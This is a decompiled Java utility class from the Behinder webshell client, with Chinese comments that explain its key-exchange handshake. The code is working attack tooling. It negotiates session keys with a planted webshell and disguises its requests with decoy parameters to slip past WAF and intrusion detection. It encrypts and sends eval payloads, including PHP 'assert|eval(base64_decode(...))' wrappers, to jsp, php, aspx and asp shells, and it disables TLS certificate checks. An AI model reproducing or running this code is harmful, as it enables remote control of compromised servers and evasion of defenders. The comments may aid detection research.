//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package net.rebeyond.behinder.utils;

import java.util.Base64;
import net.rebeyond.behinder.core.Crypt;
import net.rebeyond.behinder.core.Params;
import net.rebeyond.behinder.ui.Main;
import net.rebeyond.behinder.utils.jc.Run;
import org.eclipse.swt.widgets.Control;
import org.eclipse.swt.widgets.MessageBox;

import javax.net.ssl.*;
import javax.tools.*;
import javax.tools.JavaFileObject.Kind;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.List;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 工具类
 */
public class Utils {
    private static Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap<>();

    public Utils() {
    }

    public static boolean checkIP(String ipAddress) {
        String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
        Pattern pattern = Pattern.compile(ip);
        Matcher matcher = pattern.matcher(ipAddress);
        return matcher.matches();
    }

    public static boolean checkPort(String portTxt) {
        String port = "([0-9]{1,5})";
        Pattern pattern = Pattern.compile(port);
        Matcher matcher = pattern.matcher(portTxt);
        return matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535;
    }

    /**
     * 冰蝎是先请求服务端，服务端判断请求之后生成一个 128 位的随机数，并将这个 128 位的随机数写入到 session 里面，并将这个 128 位的随机数返回给客户端，但是客户端并不会使用这个 key 作为之后的通讯的 key，而是会继续重复上面过程，不断获取 key，直到满足特定条件（下面的贴出代码）之后，才会确定是最终的 key。客户端会保存这个 key 和响应报文里面的 set-cookie 的值。这个 key 就是之后客户端和服务端进行通讯的密匙。
     *
     * @param getUrl
     * @param password
     * @param requestHeaders
     * @return
     * @throws Exception
     */
    public static Map<String, String> getKeyAndCookie(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
        disableSslVerification();
        Map<String, String> result = new HashMap<>();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        //getUrl 增加Guid随机参数，在后面的 getRawKey 方法中将复用
        URL url = new URL(fillUrlParam(getUrl,false) + "&" + password + "=" + (new Random()).nextInt(1000));

        HttpURLConnection.setFollowRedirects(false);
        Object urlConnection;
        String urlwithSession;
        String errorMsg;
        if (url.getProtocol().equals("https")) {
            if (Main.currentProxy != null) {
                urlConnection = url.openConnection(Main.currentProxy);
                if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                    urlwithSession = "Proxy-Authorization";
                    errorMsg = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                    ((HttpURLConnection) urlConnection).setRequestProperty(urlwithSession, errorMsg);
                }
            } else {
                urlConnection = url.openConnection();
            }
        } else if (Main.currentProxy != null) {
            urlConnection = url.openConnection(Main.currentProxy);
            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                urlwithSession = "Proxy-Authorization";
                errorMsg = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                ((HttpURLConnection) urlConnection).setRequestProperty(urlwithSession, errorMsg);
            }
        } else {
            urlConnection = url.openConnection();
        }

        for (String s : requestHeaders.keySet()) {
            urlwithSession = s;
            ((HttpURLConnection) urlConnection).setRequestProperty(urlwithSession, requestHeaders.get(urlwithSession));
        }

        if (((HttpURLConnection) urlConnection).getResponseCode() == 302 || ((HttpURLConnection) urlConnection).getResponseCode() == 301) {
            urlwithSession = ((String) ((List) ((HttpURLConnection) urlConnection).getHeaderFields().get("Location")).get(0));
            if (!urlwithSession.startsWith("http")) {
                urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession;
                urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
            }

            result.put("urlWithSession", urlwithSession);
        }

        //服务端的木马里面会判断发送上来的请求是否带有 pass 参数，而在 getKeyAndCookie 里，password 的值就是连接的时候的访问密码里的值，所以在连接的时候访问密码应该要填 pass，否则响应报文会返回密匙获取失败，密码错误的错误信息.
        boolean error = false;
        errorMsg = "";
        if (((HttpURLConnection) urlConnection).getResponseCode() == 500) {
            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if (((HttpURLConnection) urlConnection).getResponseCode() == 404) {
            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getInputStream());
        }

        br = new BufferedReader(isr);

        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
        }

        br.close();
        if (error) {
            throw new Exception(errorMsg);
        } else {
            //密匙获取成功的话，会返回一个 128 位的密匙，并保存在 rawKey_1 里面。
            String rawKey_1 = matchKey(sb.toString());
            if (null == rawKey_1) {
                throw new Exception("页面存在，但是无法获取密钥!");
            } else {
                int start = 0;
                int end = 0;
                int cycleCount = 0;

                //判断得到的密匙 rawKey_1 之后，进入循环调用 getRawKey 方法，并获取 rawKey_2，并且将 rawKey_1 和 rawKey_2 进行异或操作。获取 rawKey_2 的方法和获取 rawKey_1 基本是一样的。
                while (true) {
                    Map<String, String> KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
                    String rawKey_2 = KeyAndCookie.get("key");
                    byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());

                    int i;
                    for (i = 0; i < temp.length; ++i) {
                        if (temp[i] > 0) {
                            if (start == 0 || i <= start) {
                                start = i;
                            }
                            break;
                        }
                    }

                    for (i = temp.length - 1; i >= 0; --i) {
                        if (temp[i] > 0) {
                            if (i >= end) {
                                end = i + 1;
                            }
                            break;
                        }
                    }

                    //上面虽然获取了 rawKey_1 以及是 rawKey_1 和 rawKey_2 异或之后的 temp 字节数组，但是实际上最终的 finalKey 其实都是使用 rawKey_2，temp 数组只是用来控制循环的结束条件。
                    // 每一次循环，都会重新获取 rawKey_2，重新和 rawKey_1 异或生成 temp 字节数组，其中 temp 字节数组会在两个循环里面控制 start 和 end 变量的值，
                    // 当 end-start==16 时，结束循环，并返回最新获取的 rawKey_2 作为 finalKey。
                    if (end - start == 16) {
                        result.put("cookie", KeyAndCookie.get("cookie"));
                        result.put("beginIndex", String.valueOf(start));
                        result.put("endIndex", String.valueOf(temp.length - end));
                        //返回的 finalKey 就是循环最后一轮获取的 rawKey_2，所以 rawKey_1 和 temp 字节数组对于最终的 finalKey 来说其实并没有用到。
                        // 我目前的一个猜测是动态控制请求服务端获取 key 的次数，不固定向服务端请求密匙的次数，以此来绕过 waf 或 nids 的一些检测特征，但是其实 waf 或者 nids 将同一个会话服务端向客户端返回的可疑的 128 位随机数保存，然后取最后一次保存的 128 位随机数作为这个会话的通讯密匙，然后解密这个会话的通讯内容，如果可以成功解密和进行 base64 解码，那么就可以判断明文内容是不是触发检测规则。
                        String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
                        result.put("key", finalKey);
                        return result;
                    }

                    if (cycleCount > 10) {
                        throw new Exception("Can't figure out the key!");
                    }

                    ++cycleCount;
                }
            }
        }
    }

    private static Map<String, String> getRawKey(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
        Map<String, String> result = new HashMap<>();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        URL url = new URL(fillUrlParam(getUrl, false) + "&" + password + "=" + (new Random()).nextInt(1000));
        //if (getUrl.indexOf("?") > 0) {
        //    url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
        //} else {
        //    url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
        //}

        HttpURLConnection.setFollowRedirects(false);
        Object urlConnection;
        String cookieValues;
        String headerValue;
        if (url.getProtocol().equals("https")) {
            if (Main.currentProxy != null) {
                urlConnection = url.openConnection(Main.currentProxy);
                if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                    cookieValues = "Proxy-Authorization";
                    headerValue = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                    ((HttpURLConnection) urlConnection).setRequestProperty(cookieValues, headerValue);
                }
            } else {
                urlConnection = url.openConnection();
            }
        } else if (Main.currentProxy != null) {
            urlConnection = url.openConnection(Main.currentProxy);
            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                cookieValues = "Proxy-Authorization";
                headerValue = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                ((HttpURLConnection) urlConnection).setRequestProperty(cookieValues, headerValue);
            }
        } else {
            urlConnection = url.openConnection();
        }

        for (String s : requestHeaders.keySet()) {
            cookieValues = s;
            ((HttpURLConnection) urlConnection).setRequestProperty(cookieValues, requestHeaders.get(cookieValues));
        }

        cookieValues = "";
        Map<String, List<String>> headers = ((HttpURLConnection) urlConnection).getHeaderFields();
        Iterator<String> httpHeaders = headers.keySet().iterator();

        String line;
        while (httpHeaders.hasNext()) {
            String headerName = httpHeaders.next();
            // Set-Cookie: JSESSIONID=9DB71C35C182C8C951E4A230FF6063A0; Path=/; HttpOnly
            if (headerName != null && headerName.equalsIgnoreCase("Set-Cookie")) {
                for (Iterator iterator = ((List) headers.get(headerName)).iterator(); iterator.hasNext(); )
                {
                    line = (String) iterator.next();
                    //截取cookies中有效数据
                    int pos = line.indexOf("; ");
                    if (pos > 0) {
                        line = line.substring(0, pos);
                    }
                    cookieValues = cookieValues + ";" + line;
                }

                cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
                //break; //需要把所有 Set-Cookie获取到
            }
        }
        result.put("cookie", cookieValues);

        boolean error = false;
        String errorMsg = "";
        if (((HttpURLConnection) urlConnection).getResponseCode() == 500) {
            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if (((HttpURLConnection) urlConnection).getResponseCode() == 404) {
            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getInputStream());
        }

        br = new BufferedReader(isr);
        while ((line = br.readLine()) != null) {
            sb.append(line);
        }
        br.close();
        if (error) {
            throw new Exception(errorMsg);
        } else {
            String key = matchKey(sb.toString());
            if (null != key) {
                result.put("key", key);
            }
            return result;
        }
    }

    /**
     * 提取请求数据中的 key
     * @param htmlContent
     * @return
     */
    private static String matchKey(String htmlContent) {
        String result = null;
        if (htmlContent != null && htmlContent.length() > 0) {
            //分组匹配后需要取 group(1)
            String pattern = htmlContent.length() <= 32 ? "[a-fA-F0-9]{16}" : "value=\"([a-fA-F0-9]{16})\"";
            Pattern r = Pattern.compile(pattern);
            Matcher matcher = r.matcher(htmlContent);
            while (matcher.find()) {
                int index = matcher.groupCount();
                String key = matcher.group(index);
                System.out.println("ukey=" + key);
                result = key;
            }
        }
        return result;
    }

    public static String sendPostRequest(String urlPath, String cookie, String data) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data.getBytes());
        outwritestream.flush();
        outwritestream.close();
        String line;
        if (conn.getResponseCode() == 200) {
            for (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; result = result.append(line + "\n")) {
            }
        }

        return result.toString();
    }

    public static Map<String, Object> requestAndParse(String urlPath, Map<String, String> header, byte[] data, int beginIndex, int endIndex) throws Exception {
        Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data);
        byte[] resData = (byte[]) resultObj.get("data");
        if ((beginIndex != 0 || endIndex != 0) && resData.length - endIndex >= beginIndex) {
            resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
        }

        resultObj.put("data", resData);
        return resultObj;
    }

    /**
     * 填充请求参数
     *
     * @param urlPath
     * @param requestPost
     * @return
     */
    public static String fillUrlParam(String urlPath, boolean requestPost) {
        StringBuilder stringBuilder = new StringBuilder(128);
        stringBuilder.append(urlPath);
        if (urlPath.indexOf("?") == -1) {
            stringBuilder.append("?user=cnzzr");
        }
        int uaIndex = (new Random()).nextInt(RequestType.length - 1);
        final String currentVal = RequestType[uaIndex];
        stringBuilder.append("&module=").append(currentVal);

        stringBuilder.append("&id=").append(UUID.randomUUID().toString());
        if (requestPost) {
            stringBuilder.append("&action=Update");
        } else {
            stringBuilder.append("&_=").append(String.valueOf(System.currentTimeMillis()));
        }
        return stringBuilder.toString();
    }

    private static String[] RequestType = {"Dept", "Person", "Position", "Language", "Class", "Teacher", "Product"};

    public static Map<String, Object> sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception {
        Map<String, Object> result = new HashMap<>();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        //cnzzr 修改增加请求参数 action
        String urlPathWithRamdon = fillUrlParam(urlPath,true);
        URL url = new URL(urlPathWithRamdon);
        HttpURLConnection conn;
        String key;
        if (Main.currentProxy != null) {
            conn = (HttpURLConnection) url.openConnection(Main.currentProxy);
            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                key = "Proxy-Authorization";
                String headerValue = "Basic " + Base64.getEncoder().encodeToString((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                conn.setRequestProperty(key, headerValue);
            }
        } else {
            conn = (HttpURLConnection) url.openConnection();
        }

        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        if (header != null) {

            for (String s : header.keySet()) {
                key = s;
                conn.setRequestProperty(key, header.get(key));
            }
        }

        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        byte[] buffer;
        boolean var10;
        DataInputStream din;
        int length;
        if (conn.getResponseCode() == 200) {
            din = new DataInputStream(conn.getInputStream());
            buffer = new byte[1024];
            var10 = false;

            while ((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }

            byte[] resData = bos.toByteArray();
            System.out.println("res before decrypt:" + new String(resData));
            result.put("data", resData);
            Map<String, String> responseHeader = new HashMap<>();

            for (String headerKey : conn.getHeaderFields().keySet()) {
                responseHeader.put(headerKey, conn.getHeaderField(headerKey));
            }

            responseHeader.put("status", String.valueOf(conn.getResponseCode()));
            result.put("header", responseHeader);
            return result;
        } else {
            din = new DataInputStream(conn.getErrorStream());
            buffer = new byte[1024];
            var10 = false;

            while ((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }

            throw new Exception(new String(bos.toByteArray(), "GBK"));
        }
    }

    public static String sendPostRequest(String urlPath, String cookie, byte[] data) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        BufferedReader reader;
        String line;
        if (conn.getResponseCode() == 200) {
            for (reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        } else {
            for (reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常" + sb.toString());
        }
    }

    /**
     * 获取冰蝎版本更新信息，禁用！
     * @param urlPath
     * @param cookie
     * @return
     * @throws Exception
     */
    public static String sendGetRequest(String urlPath, String cookie) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestProperty("Content-Type", "text/plain");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        BufferedReader reader;
        String line;
        if (conn.getResponseCode() == 200) {
            for (reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        } else {
            for (reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常" + sb.toString());
        }
    }

    public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
        byte[] result = null;
        byte[] encrypedBincls;
        if (type.equals("jsp")) {
            encrypedBincls = Crypt.Encrypt(payload, key);
            String basedEncryBincls = Base64.getEncoder().encodeToString(encrypedBincls);
            result = basedEncryBincls.getBytes();
        } else if (type.equals("php")) {
            encrypedBincls = ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(payload) + "'));").getBytes();
            encrypedBincls = Crypt.EncryptForPhp(encrypedBincls, key, encryptType);
            result = Base64.getEncoder().encodeToString(encrypedBincls).getBytes();
        } else if (type.equals("aspx")) {
            Map<String, String> params = new LinkedHashMap<>();
            params.put("code", new String(payload));
            result = getData(key, encryptType, "Eval", params, type);
        } else if (type.equals("asp")) {
            encrypedBincls = Crypt.EncryptForAsp(payload, key);
            result = encrypedBincls;
        }

        return result;
    }

    /**
     * getData 方法是使用 key 加密要执行的代码的 class 字节数组，并进行 base64 编码
     */
    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type) throws Exception {
        return getData(key, encryptType, className, params, type, null);
    }

    /**
     * getData 方法是使用 key 加密要执行的代码的 class 字节数组，并进行 base64 编码
     *  会调用 net.rebeyond.behinder.core.Params 里面的 getParamedClass 方法，传入 BasicInfo 参数，使用 ASM 框架来动态修改 class 文件中的属性值，详细可参考 https://xz.aliyun.com/t/2744 这篇文章
     */
    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception {
        byte[] bincls;
        byte[] encrypedBincls;
        if (type.equals("jsp")) {
            className = "net.rebeyond.behinder.payload.java." + className;
            bincls = Params.getParamedClass(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(bincls, extraData);
            }

            encrypedBincls = Crypt.Encrypt(bincls, key);
            String basedEncryBincls = Base64.getEncoder().encodeToString(encrypedBincls);
            return basedEncryBincls.getBytes();
        } else if (type.equals("php")) {
            bincls = Params.getParamedPhp(className, params);
            bincls = Base64.getEncoder().encodeToString(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(bincls, extraData);
            }

            encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return Base64.getEncoder().encodeToString(encrypedBincls).getBytes();
        } else if (type.equals("aspx")) {
            bincls = Params.getParamedAssembly(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(bincls, extraData);
            }

            encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
            return encrypedBincls;
        } else if (type.equals("asp")) {
            bincls = Params.getParamedAsp(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(bincls, extraData);
            }

            encrypedBincls = Crypt.EncryptForAsp(bincls, key);
            return encrypedBincls;
        } else {
            return null;
        }
    }

    public static byte[] getFileData(String filePath) throws Exception {
        byte[] fileContent = new byte[0];
        FileInputStream fis = new FileInputStream(new File(filePath));
        byte[] buffer = new byte[10240000];

        int length;
        for (boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
        }

        fis.close();
        return fileContent;
    }

    public static List<byte[]> splitBytes(byte[] content, int size) throws Exception {
        List<byte[]> result = new ArrayList<>();
        byte[] buffer = new byte[size];
        ByteArrayInputStream bis = new ByteArrayInputStream(content);
        boolean var5 = false;

        int length;
        while ((length = bis.read(buffer)) > 0) {
            result.add(Arrays.copyOfRange(buffer, 0, length));
        }

        bis.close();
        return result;
    }

    public static void setClipboardString(String text) {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        Transferable trans = new StringSelection(text);
        clipboard.setContents(trans, null);
    }

    public static byte[] getResourceData(String filePath) throws Exception {
        InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buffer = new byte[102400];
        boolean var4 = false;

        int num;
        while ((num = is.read(buffer)) != -1) {
            bos.write(buffer, 0, num);
            bos.flush();
        }

        is.close();
        return bos.toByteArray();
    }

    public static byte[] ascii2unicode(String str, int type) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(buf);
        byte[] var7;
        int var6 = (var7 = str.getBytes()).length;

        for (int var5 = 0; var5 < var6; ++var5) {
            byte b = var7[var5];
            out.writeByte(b);
            out.writeByte(0);
        }

        if (type == 1) {
            out.writeChar(0);
        }

        return buf.toByteArray();
    }

    public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        output.write(a);
        output.write(b);
        return output.toByteArray();
    }

    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
        return Run.getClassFromSourceCode(sourceCode);
    }

    public static String getSelfPath() throws Exception {
        String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        currentPath = (new File(currentPath)).getCanonicalPath();
        return currentPath;
    }

    public static void main(String[] args) {
        String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";

        try {
            getClassFromSourceCode(sourceCode);
        } catch (Exception var3) {
            var3.printStackTrace();
        }

    }

    private static void disableSslVerification() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                @Override
                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }

                @Override
                public void checkClientTrusted(X509Certificate[] certs, String authType) {
                }

                @Override
                public void checkServerTrusted(X509Certificate[] certs, String authType) {
                }
            }};
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new SecureRandom());
            List<String> cipherSuites = new ArrayList<>();
            String[] var6;
            int var5 = (var6 = sc.getSupportedSSLParameters().getCipherSuites()).length;

            for (int var4 = 0; var4 < var5; ++var4) {
                String cipher = var6[var4];
                if (!cipher.contains("_DHE_") && !cipher.contains("_DH_")) {
                    cipherSuites.add(cipher);
                }
            }

            HttpsURLConnection.setDefaultSSLSocketFactory(new Utils.MySSLSocketFactory(sc.getSocketFactory(), cipherSuites.toArray(new String[0])));
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                @Override
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        } catch (NoSuchAlgorithmException var7) {
            var7.printStackTrace();
        } catch (KeyManagementException var8) {
            var8.printStackTrace();
        }

    }

    public static void showError(Control control, String errorTxt) {
        MessageBox dialog = new MessageBox(control.getShell(), 33);
        dialog.setText("保存失败");
        dialog.setMessage(errorTxt);
        dialog.open();
    }

    public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager> {
        protected MyJavaFileManager(JavaFileManager fileManager) {
            super(fileManager);
        }

        @Override
        public JavaFileObject getJavaFileForInput(Location location, String className, Kind kind) throws IOException {
            JavaFileObject javaFileObject = Utils.fileObjects.get(className);
            if (javaFileObject == null) {
                super.getJavaFileForInput(location, className, kind);
            }

            return javaFileObject;
        }

        @Override
        public JavaFileObject getJavaFileForOutput(Location location, String qualifiedClassName, Kind kind, FileObject sibling) throws IOException {
            JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
            Utils.fileObjects.put(qualifiedClassName, javaFileObject);
            return javaFileObject;
        }
    }

    public static class MyJavaFileObject extends SimpleJavaFileObject {
        private String source;
        private ByteArrayOutputStream outPutStream;

        public MyJavaFileObject(String name, String source) {
            super(URI.create("String:///" + name + Kind.SOURCE.extension), Kind.SOURCE);
            this.source = source;
        }

        public MyJavaFileObject(String name, Kind kind) {
            super(URI.create("String:///" + name + kind.extension), kind);
            this.source = null;
        }

        @Override
        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
            if (this.source == null) {
                throw new IllegalArgumentException("source == null");
            } else {
                return this.source;
            }
        }

        @Override
        public OutputStream openOutputStream() throws IOException {
            this.outPutStream = new ByteArrayOutputStream();
            return this.outPutStream;
        }

        public byte[] getCompiledBytes() {
            return this.outPutStream.toByteArray();
        }
    }

    private static class MySSLSocketFactory extends SSLSocketFactory {
        private SSLSocketFactory sf;
        private String[] enabledCiphers;

        private MySSLSocketFactory(SSLSocketFactory sf, String[] enabledCiphers) {
            this.sf = null;
            this.enabledCiphers = null;
            this.sf = sf;
            this.enabledCiphers = enabledCiphers;
        }

        private Socket getSocketWithEnabledCiphers(Socket socket) {
            if (this.enabledCiphers != null && socket != null && socket instanceof SSLSocket) {
                ((SSLSocket) socket).setEnabledCipherSuites(this.enabledCiphers);
            }

            return socket;
        }

        @Override
        public Socket createSocket(Socket s, String host, int port, boolean autoClose) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
        }

        @Override
        public String[] getDefaultCipherSuites() {
            return this.sf.getDefaultCipherSuites();
        }

        @Override
        public String[] getSupportedCipherSuites() {
            return this.enabledCiphers == null ? this.sf.getSupportedCipherSuites() : this.enabledCiphers;
        }

        @Override
        public Socket createSocket(String host, int port) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
        }

        @Override
        public Socket createSocket(InetAddress address, int port) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
        }

        @Override
        public Socket createSocket(String host, int port, InetAddress localAddress, int localPort) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
        }

        @Override
        public Socket createSocket(InetAddress address, int port, InetAddress localaddress, int localport) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
        }
    }
}
